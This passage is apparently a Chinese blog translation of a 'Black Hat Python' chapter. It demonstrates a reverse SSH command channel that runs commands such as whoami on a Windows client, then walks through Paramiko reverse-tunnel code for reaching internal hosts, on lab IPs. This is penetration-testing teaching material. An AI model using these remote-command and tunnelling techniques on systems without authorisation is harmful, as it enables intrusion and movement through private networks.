<h3 id="Kicking-the-Tires-2"><a href="#Kicking-the-Tires-2" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>在演示中，我们将在我们的(作者的)Windows机器上运行客户端，在Mac上运行服务器端。下面我们启动服务器:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% python ssh_server.py</span><br><span class="line">[+] Listening <span class="keyword">for</span> connection ...</span><br></pre></td></tr></table></figure>

<p>现在，在Windows机器上，我们启动客户端:</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>&gt;: $ <span class="title">python</span> <span class="title">ssh_rcmd.py</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>:</span></span><br><span class="line"><span class="function"><span class="title">Welcome</span> <span class="title">to</span> <span class="title">bh_ssh</span></span></span><br></pre></td></tr></table></figure>

<p>回到服务器上，我们看到了连接情况:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] Got a connection! from (<span class="string">'192.168.1.208'</span>, 61852)</span><br><span class="line">[+] Authenticated!</span><br><span class="line">ClientConnected</span><br><span class="line">Enter <span class="built_in">command</span>: whoami</span><br><span class="line">desktop-cc91n7i\tim</span><br><span class="line">Enter <span class="built_in">command</span>: ipconfig</span><br><span class="line">Windows IP Configuration</span><br><span class="line">&lt;snip&gt;</span><br></pre></td></tr></table></figure>

<p>您可以看到客户机已成功连接，此时我们将运行一些命令。我们在SSH客户端中看不到任何内容，但是我们发送的命令在客户机上已经执行，而且输出被发送回到SSH服务器。</p>
<h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><p>在上一节中，我们构建了一个工具，让我们可以通过将命令输入SSH客户端，并在远程SSH服务器上运行命令。另一种技术是使用SSH <em>tunnel</em> 。SSH隧道将发送打包在SSH内部的网络流量，而不是向服务器发送命令，SSH服务器将解包并传递它。</p>
<p>假设您处于以下情况:您可以远程访问内部网络上的SSH服务器，但您希望访问同一网络上的web服务器。你不能直接访问web服务器。安装了SSH的服务器确实可以访问，但是这个SSH服务器没有您想要使用的工具。</p>
<p>克服这个问题的一种方法是建立一个 <em>forward</em> SSH隧道。例如，这将允许您运行命令<code>ssh -L 8008:web:80 justin@sshserver</code>以用户 <em>justin</em> 的身份连接SSH服务器，并在本地系统上设置端口8008。您发送到端口8008的任何内容都将通过现有的SSH隧道传输到SSH服务器，SSH服务器将把它传送到web服务器。如图2-1所示。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20210708200124309.png" alt="image-20210708200124309"></p>
<p>这很棒，但是请记住，没有多少Windows系统运行SSH服务器服务。不过，也不是什么都没有。我们可以配置一个 <em>reverse</em> SSH隧道连接。在本例中，我们以平常的方式从Windows客户机连接到自己的SSH服务器。通过SSH连接，我们还在SSH服务器上指定一个远程端口，然后被隧道连接到本地主机和端口，如图2-2所示。例如，我们可以使用这个本地主机和端口来开启端口3389以使用Remote Desktop(远程桌面)访问内部系统，或访问Windows客户机可以访问的另一系统(就像我们示例中的web服务器)。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20210708200139798.png" alt="image-20210708200139798"></p>
<p>Paramiko演示文件中包含一个名为 <em>rforward.py</em> 的文件，它就是这样的功能。它的功能完成得很好，所以在这本书中我们不会重新写这个文件。然而，我们将指出几个重要的点，并通过一个例子来演示如何使用它。打开<em>forward.py*，跳到 *main()</em> ，然后继续跟进:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    options, server, remote = parse_options() [<span class="number">1</span>]</span><br><span class="line">    password = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> options.readpass:</span><br><span class="line">        password = getpass.getpass(<span class="string">'Enter SSH password: '</span>)</span><br><span class="line">    client = paramiko.SSHClient() [<span class="number">2</span>]</span><br><span class="line">    client.load_system_host_keys()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.WarningPolicy())</span><br><span class="line">    </span><br><span class="line">    verbose(<span class="string">'Connecting to ssh host %s:%d ...'</span> % (server[<span class="number">0</span>], server[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client.connect(server[<span class="number">0</span>],</span><br><span class="line">                       server[<span class="number">1</span>],</span><br><span class="line">                       username=options.user,</span><br><span class="line">                       key_filename=options.keyfile,</span><br><span class="line">                       look_for_keys=options.look_for_keys,</span><br><span class="line">                       password=password</span><br><span class="line">         )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'*** Failed to connect to %s:%d: %r'</span> % (server[<span class="number">0</span>], server[<span class="number">1</span>], e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">    verbose(</span><br><span class="line">        <span class="string">'Now forwarding remote port %d to %s:%d ...'</span></span><br><span class="line">         % (options.port, remote[<span class="number">0</span>], remote[<span class="number">1</span>])</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        reverse_forward_tunnel( [<span class="number">3</span>]</span><br><span class="line">              options.port, remote[<span class="number">0</span>], remote[<span class="number">1</span>], client.get_transport()</span><br><span class="line">          )</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">'C-c: Port forwarding stopped.'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>在设置Paramiko SSH客户端连接[2] (看起来应该非常熟悉了) 之前，在顶部[1]的几行进行了两次检查，以确保将所有必要的参数传递给脚本。<em>main()</em> 的最后一节调用了 <em>reverse_forward_tunnel</em> 函数[3]。</p>
<p>让我们来看看这个函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_forward_tunnel</span><span class="params">(server_port, remote_host, remote_port, transport)</span>:</span></span><br><span class="line">    [<span class="number">1</span>] transport.request_port_forward(<span class="string">''</span>, server_port)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        [<span class="number">2</span>] chan = transport.accept(<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> chan <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        [<span class="number">3</span>] thr = threading.Thread(</span><br><span class="line">            target=handler, args=(chan, remote_host, remote_port)</span><br><span class="line">        )</span><br><span class="line">        thr.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        thr.start()</span><br></pre></td></tr></table></figure>

<p>在Paramiko中，有两个主要的类函数用于通信: <em>transport</em> 和 <em>channel</em> ，前者负责建立和维护加密的连接，后者类似于套接字，用于在加密的传输会话中发送和接收数据。这部分，我们开始使用Paramiko的 <em>request_port_forward</em> 来转发来自SSH服务器上端口[1]的TCP连接，并启动一个新的传输通道[2]。然后，通过通道，我们调用函数处理程序[3]。</p>
<p>但我们还没有完成。我们需要编写 <em>handler</em> 函数来管理每个线程的通信:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span><span class="params">(chan, host, port)</span>:</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect((host, port))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        verbose(<span class="string">'Forwarding request to %s:%d failed: %r'</span> % (host, port, e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line">    verbose(</span><br><span class="line">        <span class="string">'Connected!  Tunnel open %r -&gt; %r -&gt; %r'</span></span><br><span class="line">        % (chan.origin_addr, chan.getpeername(), (host, port))</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: [<span class="number">1</span>]</span><br><span class="line">        r, w, x = select.select([sock, chan], [], [])</span><br><span class="line">        <span class="keyword">if</span> sock <span class="keyword">in</span> r:</span><br><span class="line">            data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            chan.send(data)</span><br><span class="line">        <span class="keyword">if</span> chan <span class="keyword">in</span> r:</span><br><span class="line">            data = chan.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sock.send(data)</span><br><span class="line">    chan.close()</span><br><span class="line">    sock.close()</span><br><span class="line">    verbose(<span class="string">'Tunnel closed from %r'</span> % (chan.origin_addr,))</span><br></pre></td></tr></table></figure>

<p>最后，发送和接收数据[1]。我们将在下一节中进行尝试。</p>
<h3 id="Kicking-the-Tires-3"><a href="#Kicking-the-Tires-3" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>我们将从Windows系统运行 <em>rforward.py</em> ，并将其配置为从web服务器到Kali SSH服务器的隧道传输的“中间人”:</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>&gt;   <span class="title">python</span>   <span class="title">rforward.py</span> 192.168.1.203 -<span class="title">p</span> 8081 -<span class="title">r</span> 192.168.1.207:3000 --<span class="title">user</span>=<span class="title">tim</span> </span></span><br><span class="line"><span class="function">--<span class="title">password</span></span></span><br><span class="line"><span class="function"><span class="title">Enter</span> <span class="title">SSH</span> <span class="title">password</span>:</span></span><br><span class="line"><span class="function"><span class="title">Connecting</span> <span class="title">to</span> <span class="title">ssh</span> <span class="title">host</span> 192.168.1.203:22 . . . </span></span><br><span class="line"><span class="function"><span class="title">Now</span> <span class="title">forwarding</span> <span class="title">remote</span> <span class="title">port</span> 8081 <span class="title">to</span> 192.168.1.207:3000 . . .</span></span><br></pre></td></tr></table></figure>

<p>您可以看到，在Windows机器上，我们建立连接到位于192.168.1.203的SSH服务器，并打开该服务器上的端口8081，这将把通信转发到192.168.1.207端口3000。现在如果我们在我们的Linux服务器上浏览到<a href="http://127.0.0.1:8081，我们通过SSH隧道连接到192.168.1.207:3000的web服务器，如图2-3所示。">http://127.0.0.1:8081，我们通过SSH隧道连接到192.168.1.207:3000的web服务器，如图2-3所示。</a></p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20210708200211201.png" alt="image-20210708200211201"></p>
<p>如果你回到Windows机器上，你也可以看到由 Paramiko 建立的连接:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Connected!  Tunnel open (<span class="string">'127.0.0.1'</span>, 54690) -&gt; (<span class="string">'192.168.1.203'</span>, 22) -&gt; (<span class="string">'192.168.1.207'</span>, </span><br><span class="line">3000)</span><br></pre></td></tr></table></figure>

<p>SSH和SSH隧道是需要理解和使用的重要概念。黑帽子们应该知道何时以及如何正确使用SSH和SSH隧道，而Paramiko使向你现有的Python工具中添加SSH功能成为可能。</p>
<p>在本章中，我们已经创建了一些非常简单但非常有用的工具。我们鼓励您根据需要对它们进行扩展和修改，以便牢固地掌握Python的网络特性。您可以在渗透测试、开发后或查找bug等时候使用这些工具。让我们继续使用原始套接字和完成网络嗅探。然后我们将两者结合起来创建一个纯Python的主机探测扫描程序。</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ma9icCR</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-2/">https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ma9iccr.github.io" target="_blank">Ma9icCR</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Black-Hat-Python-2nd/">Black_Hat_Python_2nd</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021-06/Black-Hat-Python-2nd-3/"><img class="prev-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Black Hat Python 2nd 3</div></div></a></div><div class="next-post pull-right"><a href="/2021-06/Black-Hat-Python-2nd-1/"><img class="next-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Black Hat Python 2nd 1</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-11/" title="Black Hat Python 2nd 11"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-23</div><div class="relatedPosts_title">Black Hat Python 2nd 11</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-10/" title="Black Hat Python 2nd 10"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-20</div><div class="relatedPosts_title">Black Hat Python 2nd 10</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-9/" title="Black Hat Python 2nd 9"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-18</div><div class="relatedPosts_title">Black Hat Python 2nd 9</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-8/" title="Black Hat Python 2nd 8"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-13</div><div class="relatedPosts_title">Black Hat Python 2nd 8</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-7/" title="Black Hat Python 2nd 7"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-08</div><div class="relatedPosts_title">Black Hat Python 2nd 7</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-6/" title="Black Hat Python 2nd 6"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-03</div><div class="relatedPosts_title">Black Hat Python 2nd 6</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ma9icCR</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script></body></html>